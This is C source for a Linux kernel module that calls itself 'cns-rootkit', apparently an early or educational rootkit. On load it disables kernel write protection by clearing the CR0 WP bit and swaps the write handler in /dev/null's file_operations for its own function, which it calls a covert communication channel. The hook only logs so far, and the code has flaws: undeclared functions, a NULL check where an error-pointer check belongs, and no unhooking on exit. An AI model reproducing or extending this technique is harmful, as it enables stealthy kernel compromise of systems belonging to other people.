#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>

#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);

MODULE_LICENSE("MIT");
MODULE_AUTHOR("SAV");

ssize_t cns_rootkit_dev_null_write(struct file *, char __user *, size_t, loff_t *);


ssize_t (*original_dev_null_write) (struct file *, char __user *, size_t, loff_t *);

ssize_t cns_rootkit_dev_null_write(struct file *filep, char __user *buf, size_t count, loff_t *p) {
  printk(KERN_INFO "cns-rootkit: In my /dev/null write\n");
  unestablish_comm_channel();
  ssize_t res =  original_dev_null_write(filep, buf, count, p);
  establish_comm_channel();

  return res;
}

int establish_comm_channel(void) {
  printk(KERN_INFO "cns-rootkit: Attempting to establish communication channel\n");
  struct file *dev_null_file;
  if((dev_null_file = filp_open("/dev/null", O_RDONLY, 0)) == NULL) {
    return -1;
  }
  printk(KERN_INFO "cns-rootkit: Opened /dev/null for reading\n");
  struct file_operations *dev_null_fop;
  dev_null_fop = (struct file_operations *) dev_null_file->f_op;
  filp_close(dev_null_file, 0);
  printk(KERN_INFO "cns-rootkit: Got file_operations structure and closed /dev/null\n");
  original_dev_null_write = dev_null_fop->write;
  DISABLE_W_PROTECTED_MEMORY
  dev_null_fop->write = cns_rootkit_dev_null_write;
  ENABLE_W_PROTECTED_MEMORY
  printk(KERN_INFO "cns-rootkit: Successfully established communication channel\n");
  return 0;
}

int unestablish_comm_channel(void) {
  printk(KERN_INFO "cns-rootkit: Attempting to unestablish communication channel\n");
  struct file *dev_null_file;
  if((dev_null_file = filp_open("/dev/null", O_RDONLY, 0)) == NULL) {
    return -1;
  }

  struct file_operations *dev_null_fop;
  dev_null_fop = (struct file_operations *) dev_null_file->f_op;
  filp_close(dev_null_file, 0);

  dev_null_fop->write = original_dev_null_write;

  printk(KERN_INFO "cns-rootkit: Successfully unestablished communication channel\n");
  return 0;
}

static int cns_rootkit_init(void) {
  printk(KERN_INFO "cns-rootkit: Init\n");

  if(establish_comm_channel() < 0) {
    printk(KERN_INFO "cns-rootkit: Failed to establish communication channel\n");
  }
  return 0;
}

static void cns_rootkit_exit(void) {
  printk(KERN_INFO "cns-rootkit: Exit\n");
}

module_init(cns_rootkit_init);
module_exit(cns_rootkit_exit);
